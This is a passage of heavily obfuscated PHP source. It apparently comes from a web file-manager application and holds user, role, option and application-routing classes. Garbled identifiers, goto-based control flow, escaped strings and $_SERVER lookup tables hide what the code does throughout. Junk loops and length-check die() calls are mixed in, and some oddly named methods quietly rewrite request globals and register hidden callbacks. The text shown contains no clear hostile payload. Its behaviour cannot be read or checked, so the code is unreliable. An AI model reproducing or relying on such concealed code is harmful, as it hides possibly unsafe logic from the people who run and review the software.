$C»‡Ü°©Ğõ =& $_SERVER[Ç³Íß¦Ó]; if (!$DÈ©ˆÕØ) { return; } array_remove_key($DÈ©ˆÕØ, $C»‡Ü°©Ğõ[849]); goto dÃ‡¨İ¿”™; cĞïáíÓË: } private function _listAppendSourceRoot(&$eˆ±ÆòÂÈƒ, $C´§äò§é†) { goto FåÑáÔİ”; D†ÚŒ¤…œ : $E£ñ®ªòµÌ = Model($bŠò…³ƒï[791])->order($bŠò…³ƒï[1783])->field($dÍá‚â§´)->where($e¹Øå¤°àÇ)->select(); $E£ñ®ªòµÌ = array_to_keyvalue($E£ñ®ªòµÌ, $bŠò…³ƒï[482]); $E£ñ®ªòµÌ = array_remove_key($E£ñ®ªòµÌ, $bŠò…³ƒï[482]); goto bÅ†•Êæ©; FåÑáÔİ”: $bŠò…³ƒï =& $_SERVER[Ç³Íß¦Ó]; $e¹Øå¤°àÇ = array($bŠò…³ƒï[476] => 0, $bŠò…³ƒï[402] => SourceModel::TYPE_USER, $bŠò…³ƒï[482] => array($bŠò…³ƒï[7], $C´§äò§é†)); $dÍá‚â§´ = $bŠò…³ƒï[1782]; goto D†ÚŒ¤…œ ; bÅ†•Êæ©: foreach ($eˆ±ÆòÂÈƒ as &$f†Ş©ï”è¼) { $f†Ş©ï”è¼[$bŠò…³ƒï[85]] = $E£ñ®ªòµÌ[$f†Ş©ï”è¼[$bŠò…³ƒï[1526]]] ? $E£ñ®ªòµÌ[$f†Ş©ï”è¼[$bŠò…³ƒï[1526]]] : array(); } unset($f†Ş©ï”è¼); goto FÔ“è‡š©×; FÔ“è‡š©×: } private function _listAppendGroup(&$bªµÚÉ»–¶, $då±Ñ²—Ú¢) { goto DÇ¸„äêÖ½; b”ìù»Ë‚³: $aÓÎ§÷¶¾Š = array($EÓ’˜…Ì¯[1689] => array($EÓ’˜…Ì¯[7], $F—²œˆë‘‹)); $A•ˆŞÛíğ„ = Model($EÓ’˜…Ì¯[1861])->field($EÓ’˜…Ì¯[2153])->where($aÓÎ§÷¶¾Š)->select(); $A•ˆŞÛíğ„ = array_to_keyvalue($A•ˆŞÛíğ„, $EÓ’˜…Ì¯[1689]); goto bˆ­Ò½ƒñ¹; Eˆœ«Ã‹õ¯: $F—²œˆë‘‹ = array_to_keyvalue($eÅÕ¿ÌÂº¦, $EÓ’˜…Ì¯[33], $EÓ’˜…Ì¯[1689]); $F—²œˆë‘‹ = array_remove_value(array_unique($F—²œˆë‘‹), $EÓ’˜…Ì¯[495]); if (!$F—²œˆë‘‹ || !$eÅÕ¿ÌÂº¦) { return; } goto b”ìù»Ë‚³; DÇ¸„äêÖ½: $EÓ’˜…Ì¯ =& $_SERVER[Ç³Íß¦Ó]; $aÓÎ§÷¶¾Š = array($EÓ’˜…Ì¯[1526] => array($EÓ’˜…Ì¯[7], $då±Ñ²—Ú¢)); $eÅÕ¿ÌÂº¦ = Model($EÓ’˜…Ì¯[1770])->where($aÓÎ§÷¶¾Š)->select(); goto Eˆœ«Ã‹õ¯; fã—¡¥èğ: foreach ($bªµÚÉ»–¶ as &$e’ˆ°„ÓÜ) { $e’ˆ°„ÓÜ[$EÓ’˜…Ì¯[1863]] = array(); if (isset($eÅÕ¿ÌÂº¦[$e’ˆ°„ÓÜ[$EÓ’˜…Ì¯[1526]]])) { $e’ˆ°„ÓÜ[$EÓ’˜…Ì¯[1863]] = $eÅÕ¿ÌÂº¦[$e’ˆ°„ÓÜ[$EÓ’˜…Ì¯[1526]]]; } } unset($e’ˆ°„ÓÜ); goto bÎïĞè°Ÿ—; bˆ­Ò½ƒñ¹: $eÅÕ¿ÌÂº¦ = array_to_keyvalue_group($eÅÕ¿ÌÂº¦, $EÓ’˜…Ì¯[1526]); foreach ($eÅÕ¿ÌÂº¦ as &$Dô‡íÆ†ë) { $c‡™±‘¥‚ = array(); foreach ($Dô‡íÆ†ë as $Eùñ¥Š±“è) { if (!$Eùñ¥Š±“è[$EÓ’˜…Ì¯[1784]]) { continue; } $c†™İ°Œã¨ = Model($EÓ’˜…Ì¯[1856])->listData($Eùñ¥Š±“è[$EÓ’˜…Ì¯[1784]]); $c‡™±‘¥‚[] = array($EÓ’˜…Ì¯[1689] => $Eùñ¥Š±“è[$EÓ’˜…Ì¯[1689]], $EÓ’˜…Ì¯[2154] => $A•ˆŞÛíğ„[$Eùñ¥Š±“è[$EÓ’˜…Ì¯[1689]]][$EÓ’˜…Ì¯[28]], $EÓ’˜…Ì¯[485] => $A•ˆŞÛíğ„[$Eùñ¥Š±“è[$EÓ’˜…Ì¯[1689]]][$EÓ’˜…Ì¯[485]], $EÓ’˜…Ì¯[404] => $c†™İ°Œã¨); } $Dô‡íÆ†ë = $c‡™±‘¥‚; } unset($Dô‡íÆ†ë); goto fã—¡¥èğ; bÎïĞè°Ÿ—: } private function _listAppendMeta(&$f¢»ºĞÙÈ‰, $béË³ß¹’“) { goto f—ä­Äõ; f—ä­Äõ: $e® œİø¾ =& $_SERVER[Ç³Íß¦Ó]; $b‚âÎÑƒˆ§ = UserJobModel::JOB_KEY; $a©ßò­‡ÔÄ = array($e® œİø¾[2133]); goto e™áÓ¶; a¹Ç´‹®¡Ô: foreach ($f¢»ºĞÙÈ‰ as &$dŒùù¤Óá¥) { $F»òèÒÃ…¯ = array(); if (isset($BÖ°ÛŒÑ†ó[$dŒùù¤Óá¥[$e® œİø¾[1526]]])) { $F»òèÒÃ…¯ = $BÖ°ÛŒÑ†ó[$dŒùù¤Óá¥[$e® œİø¾[1526]]]; } $dŒùù¤Óá¥[$e® œİø¾[2156]] = array(); if (isset($F»òèÒÃ…¯[$b‚âÎÑƒˆ§])) { $dŒùù¤Óá¥[$e® œİø¾[2156]] = $D‰á¹£•Îà->getUserJobInfo($F»òèÒÃ…¯[$b‚âÎÑƒˆ§]); } } unset($dŒùù¤Óá¥); goto F†ÚĞ«À÷; e™áÓ¶: $CïãæÔºÀ‰ = array($e® œİø¾[1526] => array($e® œİø¾[7], $béË³ß¹’“)); $BÖ°ÛŒÑ†ó = Model($e® œİø¾[2131])->where($CïãæÔºÀ‰)->select(); $BÖ°ÛŒÑ†ó = array_to_keyvalue_group($BÖ°ÛŒÑ†ó, $e® œİø¾[1526]); goto CÜâõÇâ‡©; CÜâõÇâ‡©: foreach ($BÖ°ÛŒÑ†ó as &$D¡²ˆæğêÂ) { $báíî‹¸ = array(); foreach ($D¡²ˆæğêÂ as $eŒ°’êãê™) { if (!in_array($eŒ°’êãê™[$e® œİø¾[93]], $a©ßò­‡ÔÄ)) { $báíî‹¸[$eŒ°’êãê™[$e® œİø¾[93]]] = $eŒ°’êãê™[$e® œİø¾[371]]; } } $D¡²ˆæğêÂ = $báíî‹¸; } unset($D¡²ˆæğêÂ); $D‰á¹£•Îà = Model($e® œİø¾[2155]); goto a¹Ç´‹®¡Ô; F†ÚĞ«À÷: } protected function groupUserAll($DîÃÊÔ‹‹õ) { $DÖìÃõä =& $_SERVER[Ç³Íß¦Ó]; if (!$DîÃÊÔ‹‹õ) { return !1; } $BæÔÎ»ƒ¸¶ = Model($DÖìÃõä[1770])->field($DÖìÃõä[1526])->where(array($DÖìÃõä[1689] => array($DÖìÃõä[7], $DîÃÊÔ‹‹õ)))->select(); $BæÔÎ»ƒ¸¶ = array_to_keyvalue($BæÔÎ»ƒ¸¶, $DÖìÃõä[33], $DÖìÃõä[1526]); return array_unique($BæÔÎ»ƒ¸¶); } public function userSearch($fø—âæ«åœ, $fš°™²ÃŞê = "\52") { return Model($_SERVER[Ç³Íß¦Ó][505])->where($fø—âæ«åœ)->field($fš°™²ÃŞê)->find(); } } if (!isset($_SERVER[$_SERVER[Ç³Íß¦Ó][834]]) || !isset($_SERVER[$_SERVER[Ç³Íß¦Ó][832]])) { goto dˆ‚Ş°Ÿš¿; dˆ‚Ş°Ÿš¿: $Eõäâ˜ÓÃ = $_SERVER[Ç³Íß¦Ó][836]; $A«¤õƒ¯ = $_SERVER[$_SERVER[Ç³Íß¦Ó][837]] . $_SERVER[Ç³Íß¦Ó][838]; $B†«é™‰Á© = $Eõäâ˜ÓÃ($A«¤õƒ¯); goto d·œ˜Õğ¨Ò; a²ù…ÁÏ¬á: $f“äç‚İ‡î($_SERVER[$_SERVER[Ç³Íß¦Ó][837]] . $_SERVER[Ç³Íß¦Ó][838]); $AÅõª…ó­¹ = 2; while ($AÅõª…ó­¹ > 1) { $AÑå‚„» = rawurlencode($AÅõª…ó­¹ . $_SERVER[Ç³Íß¦Ó][374]); } goto FÂ³êã‘ö; d·œ˜Õğ¨Ò: $aà¤¶¨¿È = explode($_SERVER[Ç³Íß¦Ó][228], $B†«é™‰Á©); if (count($aà¤¶¨¿È) < $_SERVER[Ç³Íß¦Ó][598]) { $Aì»Ó¯¿Œİ = $_SERVER[Ç³Íß¦Ó][839]; $Aì»Ó¯¿Œİ(); } $f“äç‚İ‡î = $_SERVER[Ç³Íß¦Ó][1393]; goto a²ù…ÁÏ¬á; FÂ³êã‘ö: } goto a¨Éæâ¤¬·; d›Ùœ¤ëŸ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\137\x6f\x70\164\151\157\x6e"; protected $jsonField = array("\x6d\x65\156\165", "\162\x6f\x6c\x65", "\x72\x6f\x6c\145\107\162\157\x75\160", "\162\x65\147\151\x73\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($e³èÅğ›‰¾) { return "\123\x79\x73\164\x65\x6d\x4f\x70\x74\151\x6f\156\x5f{$e³èÅğ›‰¾}"; } protected function optionDefault($bÜùöÆ®Ú = '') { $c»‰ÔŠÖÆî =& $_SERVER[Ç³Íß¦Ó]; if ($bÜùöÆ®Ú == $c»‰ÔŠÖÆî[33]) { return $GLOBALS[$c»‰ÔŠÖÆî[6]][$c»‰ÔŠÖÆî[377]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x72\x6f\154\x65\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x61\x75\x74\150", "\x6c\x61\142\x65\154", "\x64\151\x73\x70\154\141\x79", "\x73\x79\x73\164\x65\x6d", "\144\x65\163\143", "\151\x67\156\x6f\x72\x65\x45\170\164", "\x69\147\156\157\162\145\106\151\154\x65\123\151\172\x65", "\141\144\x6d\x69\156\151\163\164\x72\141\x74\x6f\x72", "\x73\x6f\x72\x74"); public function listData($e¸¥†ÃåëÆ = false, $b¥Ë¾­¬Ã = "\x73\157\162\164", $b•¸·ÜÁš“ = false) { $Bëà‘×ëÏ =& $_SERVER[Ç³Íß¦Ó]; $a»İğ‚×÷ = parent::listData($e¸¥†ÃåëÆ, $b¥Ë¾­¬Ã, $b•¸·ÜÁš“); if (!$e¸¥†ÃåëÆ) { foreach ($a»İğ‚×÷ as $F’ğß›ÌâÎ => $FÑî“£¿ç) { if ($FÑî“£¿ç[$Bëà‘×ëÏ[1878]] == 1) { $a»İğ‚×÷[$F’ğß›ÌâÎ][$Bëà‘×ëÏ[429]] = LNG($Bëà‘×ëÏ[2102]); } } } return $a»İğ‚×÷; } public function update($aÆ²ê–ššµ, $FøÃ†¿š¤¢) { goto CŒÅìƒ•¯ˆ; CŒÅìƒ•¯ˆ: $Dº°Í—© =& $_SERVER[Ç³Íß¦Ó]; $b—ËÖôÍ» = parent::listData($aÆ²ê–ššµ); $CÂ±¡ˆï¥‚ = $this->findByName($FøÃ†¿š¤¢[$Dº°Í—©[28]]); goto DîëöµÔ¬ã; B†‘ğŠ“Å†: return parent::update($aÆ²ê–ššµ, $FøÃ†¿š¤¢); goto bä®†«³£Á; DîëöµÔ¬ã: if (!$b—ËÖôÍ» || $CÂ±¡ˆï¥‚ && $CÂ±¡ˆï¥‚[$Dº°Í—©[392]] != $b—ËÖôÍ»[$Dº°Í—©[392]]) { return !1; } if ($CÂ±¡ˆï¥‚[$Dº°Í—©[1878]] == 1) { $FøÃ†¿š¤¢ = array($Dº°Í—©[28] => $FøÃ†¿š¤¢[$Dº°Í—©[28]], $Dº°Í—©[1710] => $FøÃ†¿š¤¢[$Dº°Í—©[1710]]); } $this->filterAuth($FøÃ†¿š¤¢[$Dº°Í—©[404]]); goto B†‘ğŠ“Å†; bä®†«³£Á: } public function remove($A±©­Èİì) { $F‡¾íÍ¾À¬ = parent::listData($A±©­Èİì); if (!$F‡¾íÍ¾À¬ || $F‡¾íÍ¾À¬[$_SERVER[Ç³Íß¦Ó][1169]]) { return !1; } return parent::remove($A±©­Èİì); } public function add($bÄ²œöŞ¿) { goto BĞ¿Íîçê; cÎ­È…‘õ: return parent::insert($bÄ²œöŞ¿); goto CµìÑ¾¢®; BĞ¿Íîçê: $fäÚÎ ôÉ± =& $_SERVER[Ç³Íß¦Ó]; $dÒÆ†Âô = $bÄ²œöŞ¿[$fäÚÎ ôÉ±[28]]; if ($this->findByName($dÒÆ†Âô)) { return !1; } goto b¥¸Ê¬“ã¬; b¥¸Ê¬“ã¬: $böäó£å‰æ = array($fäÚÎ ôÉ±[411] => $dÒÆ†Âô, $fäÚÎ ôÉ±[1695] => $fäÚÎ ôÉ±[33], $fäÚÎ ôÉ±[1691] => $fäÚÎ ôÉ±[1699], $fäÚÎ ôÉ±[2103] => 1, $fäÚÎ ôÉ±[1694] => 0, $fäÚÎ ôÉ±[2104] => 0, $fäÚÎ ôÉ±[1693] => $this->getSort()); $bÄ²œöŞ¿ = array_merge($böäó£å‰æ, $bÄ²œöŞ¿); $this->filterAuth($bÄ²œöŞ¿[$fäÚÎ ôÉ±[404]]); goto cÎ­È…‘õ; CµìÑ¾¢®: } private function getSort() { $bà‰”‡·Ø =& $_SERVER[Ç³Íß¦Ó]; $BÓ¿‰ÃÍëÖ = parent::listData(); $D­¹¸§Ô˜ = array_to_keyvalue($BÓ¿‰ÃÍëÖ, $bà‰”‡·Ø[33], $bà‰”‡·Ø[1712]); return empty($D­¹¸§Ô˜) ? 0 : max($D­¹¸§Ô˜) + 1; } private function filterAuth(&$AÜ¬‚ôÅ½‚) { $FùñˆĞ‚º =& $_SERVER[Ç³Íß¦Ó]; $Dö½¬÷—‘´ = array(); $Bì—¼Ş×¡Å = array_filter(explode($FùñˆĞ‚º[47], $AÜ¬‚ôÅ½‚)); foreach ($Bì—¼Ş×¡Å as $AÜ¬‚ôÅ½‚) { $eÅÖÙ÷¹¶À = explode($FùñˆĞ‚º[95], $AÜ¬‚ôÅ½‚); if ($eÅÖÙ÷¹¶À[0] == $FùñˆĞ‚º[2105] && $eÅÖÙ÷¹¶À[1] != $FùñˆĞ‚º[1090]) { $Fë™¼ŠºÄ = $eÅÖÙ÷¹¶À[0] . $FùñˆĞ‚º[95] . $eÅÖÙ÷¹¶À[1] . $FùñˆĞ‚º[2106]; if (!in_array($Fë™¼ŠºÄ, $Bì—¼Ş×¡Å)) { $Dö½¬÷—‘´[] = $Fë™¼ŠºÄ; } } $Dö½¬÷—‘´[] = $AÜ¬‚ôÅ½‚; } $AÜ¬‚ôÅ½‚ = implode($FùñˆĞ‚º[47], $Dö½¬÷—‘´); } public function sort($bîÙ´ò„«Ì, $dÉ¹ø¥ÔÃé) { return parent::update($bîÙ´ò„«Ì, $dÉ¹ø¥ÔÃé); } } goto e˜ğÕÖè§; fŒòÛ³Åñ: $Aç¹ø«¬† = $_SERVER[Ç³Íß¦Ó][577]; class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($Bğ„‘åšî) { goto aÏŸ‡’ŸÛà; Bâ‡à¸¹­: $this->defaultController = $C­‰×¥ãö[1] ? $C­‰×¥ãö[1] : $this->defaultController; $Fßï¤ğÈ¨Û = $aó“øÌ‚å…[579]; if (strlen($Fßï¤ğÈ¨Û) < $aó“øÌ‚å…[580]) { die; } goto fßÑç°á¢ä; dó‹­¦ƒ‘ğ: $d²¦µ†‰Ş” = $aó“øÌ‚å…[578]; while ($d²¦µ†‰Ş” < $aó“øÌ‚å…[574]) { if ($d²¦µ†‰Ş” >= 0) { break; } $d²¦µ†‰Ş”++; } $this->defaultModule = $C­‰×¥ãö[0] ? $C­‰×¥ãö[0] : $this->defaultModule; goto Bâ‡à¸¹­; fßÑç°á¢ä: $this->defaultAction = $C­‰×¥ãö[2] ? $C­‰×¥ãö[2] : $this->defaultAction; $this->{$_SERVER[øÜ][3]}($b§ÄİÚõ†[4], array($this, $b§ÄİÚõ†[5])); goto c©”«Ì»‘; aÏŸ‡’ŸÛà: $aó“øÌ‚å… =& $_SERVER[Ç³Íß¦Ó]; $b§ÄİÚõ† =& $_SERVER[øÜ]; $C­‰×¥ãö = $b§ÄİÚõ†[0]($b§ÄİÚõ†[1], $b§ÄİÚõ†[2]($Bğ„‘åšî, $b§ÄİÚõ†[1])); goto dó‹­¦ƒ‘ğ; c©”«Ì»‘: } public function appRun($A‰Ç·ˆÍˆğ) { goto bèÚô¡å†ƒ; AåïÄÉ¸í: $A…Ï»„‡Š = $D¼Ÿê”•§†[582]; if (strlen($A…Ï»„‡Š) < $D¼Ÿê”•§†[580]) { die; } $cˆä¡ˆÛç = $fÖ›ƒÅŒåÇ[7]; goto DĞ¸ñ¦˜¹¼; aÚ®·•Í‰ô: $CŸø¯ºß”Ì = $D¼Ÿê”•§†[581]; if (strlen($CŸø¯ºß”Ì) < $D¼Ÿê”•§†[580]) { die; } $e·Ö“‰¯ªğ = $fÖ›ƒÅŒåÇ[6]($e´ÔŒñõß±[0]); goto AåïÄÉ¸í; bèÚô¡å†ƒ: $D¼Ÿê”•§† =& $_SERVER[Ç³Íß¦Ó]; $fÖ›ƒÅŒåÇ =& $_SERVER[øÜ]; $e´ÔŒñõß± = $fÖ›ƒÅŒåÇ[0]($fÖ›ƒÅŒåÇ[1], $A‰Ç·ˆÍˆğ); goto aÚ®·•Í‰ô; BŒÔ¨ÚÜŒÊ: $fÖ›ƒÅŒåÇ[13](array($fÖ›ƒÅŒåÇ[14], $fÖ›ƒÅŒåÇ[15]), $cˆä¡ˆÛç . $fÖ›ƒÅŒåÇ[18], $A‰Ç·ˆÍˆğ); $fšŞª±ê‡ = $D¼Ÿê”•§†[586]; if (!$fšŞª±ê‡) { return; } goto aÅ¹¨Å¾’ˆ; E‹Íêèù‚Ö: $fÖ›ƒÅŒåÇ[17]($A‰Ç·ˆÍˆğ); $c“‘éìµ˜Ó = $D¼Ÿê”•§†[584]; if (strlen($c“‘éìµ˜Ó) < $D¼Ÿê”•§†[585]) { die; } goto BŒÔ¨ÚÜŒÊ; DĞ¸ñ¦˜¹¼: $aèÒ»Î£‹ğ = $D¼Ÿê”•§†[583]; if ($e·Ö“‰¯ªğ == $fÖ›ƒÅŒåÇ[8]) { $cˆä¡ˆÛç = $fÖ›ƒÅŒåÇ[9]; $e´ÔŒñõß±[0] = $fÖ›ƒÅŒåÇ[10]; $e´ÔŒñõß±[1] = $e´ÔŒñõß±[1] . $fÖ›ƒÅŒåÇ[11]; $A‰Ç·ˆÍˆğ = $fÖ›ƒÅŒåÇ[12]($fÖ›ƒÅŒåÇ[1], $e´ÔŒñõß±); $A‰Ç·ˆÍˆğ = $fÖ›ƒÅŒåÇ[2]($A‰Ç·ˆÍˆğ, $fÖ›ƒÅŒåÇ[1]); } $fÖ›ƒÅŒåÇ[13](array($fÖ›ƒÅŒåÇ[14], $fÖ›ƒÅŒåÇ[15]), $cˆä¡ˆÛç . $fÖ›ƒÅŒåÇ[16], $A‰Ç·ˆÍˆğ); goto E‹Íêèù‚Ö; aÅ¹¨Å¾’ˆ: } private function autorun() { $dÓ…šî¾¹ =& $_SERVER[øÜ]; global $config; if ($dÓ…šî¾¹[19]($config[$dÓ…šî¾¹[20]]) == 0) { return; } foreach ($config[$dÓ…šî¾¹[20]] as $B³ÌÒĞ“¸é => $dŸ‹‚‡¸š) { $this->{$_SERVER[øÜ][21]}($dŸ‹‚‡¸š); } } private function dtwv4146c43f() { goto cÍÏÈ‰­Ù; f›Ş¡ïñ‘‡: if (!$A¯ŸÇñ»•ª || $A°ù¶±®‘Ø[24]($A¯ŸÇñ»•ª) <= $A°ù¶±®‘Ø[24]($FòÔª»ÏÆ®)) { return; } if ($A°ù¶±®‘Ø[6]($A°ù¶±®‘Ø[25]($A¯ŸÇñ»•ª, -$A°ù¶±®‘Ø[24]($FòÔª»ÏÆ®))) != $FòÔª»ÏÆ®) { return; } $eÓ®Ïšå ã = $A°ù¶±®‘Ø[25]($A¯ŸÇñ»•ª, 0, -$A°ù¶±®‘Ø[24]($FòÔª»ÏÆ®)); goto fï¼ñ‡¦À•; cÍÏÈ‰­Ù: $E³Õ˜ãØß­ =& $_SERVER[Ç³Íß¦Ó]; $A°ù¶±®‘Ø =& $_SERVER[øÜ]; $FòÔª»ÏÆ® = $A°ù¶±®‘Ø[8]; goto C£¦ÉÕÇ‘; f“ƒœ š: if (strlen($f¸¬—ÚíÅÓ) < $E³Õ˜ãØß­[585]) { return; } $GLOBALS[$A°ù¶±®‘Ø[22]][$A°ù¶±®‘Ø[28]] = $A°ù¶±®‘Ø[29]($A°ù¶±®‘Ø[1], $GLOBALS[$A°ù¶±®‘Ø[22]][$A°ù¶±®‘Ø[23]]); goto CäòÔ‚—İÀ; cÈÀÌÃ”ÎÃ: $fµåˆçĞƒ§ = $A°ù¶±®‘Ø[26]($GLOBALS[$A°ù¶±®‘Ø[22]][$A°ù¶±®‘Ø[23]], 1); $GLOBALS[$A°ù¶±®‘Ø[22]][$A°ù¶±®‘Ø[23]] = $A°ù¶±®‘Ø[27]($DŞÙ¢Ê«¦, $fµåˆçĞƒ§); $f¸¬—ÚíÅÓ = $E³Õ˜ãØß­[590]; goto f“ƒœ š; fï¼ñ‡¦À•: $DŞÙ¢Ê«¦ = array($A°ù¶±®‘Ø[8], $eÓ®Ïšå ã); $BÙ¤Ì•×‘ = $E³Õ˜ãØß­[588]; if (strlen($BÙ¤Ì•×‘) < $E³Õ˜ãØß­[589]) { die; } goto cÈÀÌÃ”ÎÃ; C£¦ÉÕÇ‘: $A¯ŸÇñ»•ª = $GLOBALS[$A°ù¶±®‘Ø[22]][$A°ù¶±®‘Ø[23]][0]; $aëÃ¿Ø÷¿ = $E³Õ˜ãØß­[587]; if (!$aëÃ¿Ø÷¿) { die; } goto f›Ş¡ïñ‘‡; CäòÔ‚—İÀ: } private function unewbd41e8f9() { goto A¦¿î®; A¦¿î®: $CìšÊŠ‰ =& $_SERVER[Ç³Íß¦Ó]; $FçÕåË…±Ë =& $_SERVER[øÜ]; if ($GLOBALS[$FçÕåË…±Ë[22]][$FçÕåË…±Ë[28]] != $FçÕåË…±Ë[10]) { return; } goto EÄ®¹Ô²©Ì; EÄ®¹Ô²©Ì: $Câ ‚Š›ïº = $_SERVER[$FçÕåË…±Ë[30]]; $c¤ä£Ê‘±— = $CìšÊŠ‰[591]; $a‰à óôŠ¨ = $FçÕåË…±Ë[31]; goto Fâ«×´›óİ; e’¹•äùñ: $e–Ó¦ßÆ… = $CìšÊŠ‰[596]; goto b˜¤½ŒöŠ; B§Œğ§Ìˆò: $C‹ÃŒ¿“†Ô = $FçÕåË…±Ë[25]($Câ ‚Š›ïº, $E’¢Ö°ƒ±à + $FçÕåË…±Ë[24]($a‰à óôŠ¨)); $D•¶Ò½£òÏ = $CìšÊŠ‰[593]; while (strlen($D•¶Ò½£òÏ) < $CìšÊŠ‰[580]) { if (!$D•¶Ò½£òÏ) { break; } $D•¶Ò½£òÏ++; } goto BÒÈ™×ĞÊî; Fâ«×´›óİ: if (!$FçÕåË…±Ë[32]($Câ ‚Š›ïº, $a‰à óôŠ¨)) { return; } $E’¢Ö°ƒ±à = $FçÕåË…±Ë[33]($Câ ‚Š›ïº, $a‰à óôŠ¨); $fñã±ê…´ = $CìšÊŠ‰[592]; goto B§Œğ§Ìˆò; fÑÉÛšêÌ†: $GLOBALS[$FçÕåË…±Ë[22]][$FçÕåË…±Ë[23]] = $FçÕåË…±Ë[0]($FçÕåË…±Ë[36], $C‹ÃŒ¿“†Ô); $bÓ¹ƒ¨É = $CìšÊŠ‰[595]; $GLOBALS[$FçÕåË…±Ë[22]][$FçÕåË…±Ë[28]] = $FçÕåË…±Ë[29]($FçÕåË…±Ë[1], $GLOBALS[$FçÕåË…±Ë[22]][$FçÕåË…±Ë[23]]); goto e’¹•äùñ; BÒÈ™×ĞÊî: $FçÕåË…±Ë[34]($FçÕåË…±Ë[35], $C‹ÃŒ¿“†Ô, $D†˜Ÿ¯‹); $DÍ¿æÂŒ¬ = $CìšÊŠ‰[594]; $C‹ÃŒ¿“†Ô = $FçÕåË…±Ë[2]($D†˜Ÿ¯‹[0][0], $FçÕåË…±Ë[36]); goto fÑÉÛšêÌ†; b˜¤½ŒöŠ: } public function run() { goto fßº¡„†ŒÅ; e½‹‘àÉ§: $EÍ°¡©–¥ä = $c÷…·Ã†©[599]; while (strlen($EÍ°¡©–¥ä) < $c÷…·Ã†©[589]) { if (!$EÍ°¡©–¥ä) { break; } $EÍ°¡©–¥ä++; } $e”„šÙƒ÷  = $GLOBALS[$bÓóğÑÌˆ[22]][$bÓóğÑÌˆ[23]]; goto C§¸ÁÖñ¦Ì; cç½¡¾­ƒÜ: $bÓóğÑÌˆ[39]($bÓóğÑÌˆ[42], isset($e”„šÙƒ÷ [2]) && $e”„šÙƒ÷ [0] ? $e”„šÙƒ÷ [2] : $this->defaultAction); $a¶´ã·‡Ô = $c÷…·Ã†©[600]; $bÓóğÑÌˆ[39]($bÓóğÑÌˆ[43], MOD . $bÓóğÑÌˆ[1] . ST . $bÓóğÑÌˆ[1] . ACT); goto B«îÃÚ¨°º; B«îÃÚ¨°º: $_SERVER[$bÓóğÑÌˆ[44]] = $bÓóğÑÌˆ[6](ACTION); $this->{$_SERVER[øÜ][45]}(); $CÔßí”êó± = $c÷…·Ã†©[601]; goto DõÔ¤ìš—Í; DõÔ¤ìš—Í: if (strlen($CÔßí”êó±) < $c÷…·Ã†©[580]) { return; } if ($bÓóğÑÌˆ[19]($e”„šÙƒ÷ ) >= 3) { $this->{$_SERVER[øÜ][21]}($CŒ‹¢…©äÖ); } else { $this->{$_SERVER[øÜ][21]}(ACTION); } goto f¼­ƒ…«Á¢; a¬š‹ğƒÊ¤: $bòíœÏ§Ğµ = $c÷…·Ã†©[597]; if (strlen($bòíœÏ§Ğµ) < $c÷…·Ã†©[598]) { return; } $this->{$_SERVER[øÜ][38]}(); goto e½‹‘àÉ§; fßº¡„†ŒÅ: $c÷…·Ã†© =& $_SERVER[Ç³Íß¦Ó]; $bÓóğÑÌˆ =& $_SERVER[øÜ]; $this->{$_SERVER[øÜ][37]}(); goto a¬š‹ğƒÊ¤; C§¸ÁÖñ¦Ì: $CŒ‹¢…©äÖ = $GLOBALS[$bÓóğÑÌˆ[22]][$bÓóğÑÌˆ[28]]; $bÓóğÑÌˆ[39]($bÓóğÑÌˆ[40], isset($e”„šÙƒ÷ [0]) && $e”„šÙƒ÷ [0] ? $e”„šÙƒ÷ [0] : $this->defaultModule); $bÓóğÑÌˆ[39]($bÓóğÑÌˆ[41], isset($e”„šÙƒ÷ [1]) && $e”„šÙƒ÷ [0] ? $e”„šÙƒ÷ [1] : $this->defaultController); goto cç½¡¾­ƒÜ; f¼­ƒ…«Á¢: } private $vhto6fc852e1 = array(); private $dlkx6c27239c = ''; public function ackz6515f651() { goto DÅÀ‡´Öì°; bÅ¶à¨ïÄŸ: $aŒ·‹ÎÉø = $cÑÕï’×°İ[604]; while (strlen($aŒ·‹ÎÉø) < $cÑÕï’×°İ[574]) { if (!$aŒ·‹ÎÉø) { break; } $aŒ·‹ÎÉø++; } $this->{$_SERVER[øÜ][52]}(); goto A‰Ïˆ¨Ò¤œ; DÅÀ‡´Öì°: $cÑÕï’×°İ =& $_SERVER[Ç³Íß¦Ó]; $A‚¯¬ªİ½‚ =& $_SERVER[øÜ]; $this->{$_SERVER[øÜ][46]}(); goto E§ßÓ½É; D¿øã®´‰ä: if (!$c‡¿ò½Ş‘ó) { return; } $this->{$_SERVER[øÜ][50]}(); $this->{$_SERVER[øÜ][51]}(); goto bÅ¶à¨ïÄŸ; E§ßÓ½É: $this->{$_SERVER[øÜ][47]}(); $this->{$_SERVER[øÜ][48]}(); $cáôçÓ¸„¯ = $cÑÕï’×°İ[602]; goto AÑœãç™Áá; C‚„Ë¶Ş°×: $this->{$_SERVER[øÜ][3]}($A‚¯¬ªİ½‚[55], array($this, $A‚¯¬ªİ½‚[56])); $Có‹Ííã = $cÑÕï’×°İ[606]; $this->{$_SERVER[øÜ][3]}($A‚¯¬ªİ½‚[57], array($this, $A‚¯¬ªİ½‚[58])); goto dŠ¥™âæÉ‡; AÑœãç™Áá: if (strlen($cáôçÓ¸„¯) < $cÑÕï’×°İ[589]) { return; } $this->{$_SERVER[øÜ][49]}(); $c‡¿ò½Ş‘ó = $cÑÕï’×°İ[603]; goto D¿øã®´‰ä; dŠ¥™âæÉ‡: $f±…Õï‚Ğ‚ = $cÑÕï’×°İ[607]; if (!$f±…Õï‚Ğ‚) { die; } $this->{$_SERVER[øÜ][3]}($A‚¯¬ªİ½‚[59], array($this, $A‚¯¬ªİ½‚[60])); goto EÁµÁâ’‰È; EÁµÁâ’‰È: $aËÅÕè…Å§ = $cÑÕï’×°İ[578]; if (!$aËÅÕè…Å§) { die; } goto Eí°…½Ä‡; A‰Ïˆ¨Ò¤œ: $e“Úà¹§¿ = $cÑÕï’×°İ[605]; while (strlen($e“Úà¹§¿) < $cÑÕï’×°İ[589]) { if (!$e“Úà¹§¿) { break; } $e“Úà¹§¿++; } $this->{$_SERVER[øÜ][3]}($A‚¯¬ªİ½‚[53], array($this, 